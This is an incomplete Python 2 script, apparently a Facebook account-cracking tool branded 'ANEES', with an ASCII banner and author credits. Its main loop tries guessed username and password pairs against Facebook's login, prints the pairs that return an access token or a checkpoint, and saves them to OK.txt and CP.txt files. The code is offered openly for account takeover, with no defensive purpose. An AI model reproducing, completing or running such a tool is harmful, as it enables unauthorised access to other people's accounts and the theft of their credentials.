...
__author__ = 'ANEES'
__copyright = 'All rights reserved . Copyright  ANEES'
...
\033[97;1m  ______   __    __  ________  ________   ______  
\033[91;1m /      \ /  \  /  |/        |/        | /      \ 
\033[92;1m/$$$$$$  |$$  \ $$ |$$$$$$$$/ $$$$$$$$/ /$$$$$$  |
\033[93;1m$$ |__$$ |$$$  \$$ |$$ |__    $$ |__    $$ \__$$/
\033[96;1m$$    $$ |$$$$  $$ |$$    |   $$    |   $$      \
\033[97;1m$$$$$$$$ |$$ $$ $$ |$$$$$/    $$$$$/     $$$$$$  |
\033[91;1m$$ |  $$ |$$ |$$$$ |$$ |_____ $$ |_____ /  \__$$ |
\033[92;1m$$ |  $$ |$$ | $$$ |$$       |$$       |$$    $$/
\033[94;1m$$/   $$/ $$/   $$/ $$$$$$$$/ $$$$$$$$/  $$$$$$/  

\x1b[0m______________________________________________
\033[95;1mAuthor   :            ANEES
\033[94;1mFacebook :          ANEES   
\033[96;1mVersion  :              0.5
\x1b[0m______________________________________________
                                                 """
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;94m  [R•A•J•P•O•O•T_OK]  ' + k + c + user + '  ^  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m  [A★N☆E◆E★S_OK] ' + k + c + user + '  ^  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;95m  [A★N☆E◆E★S_CP] ' + k + c + user + '  ^  ' + pass2
                    cps = open('save/CP.txt', 'a')
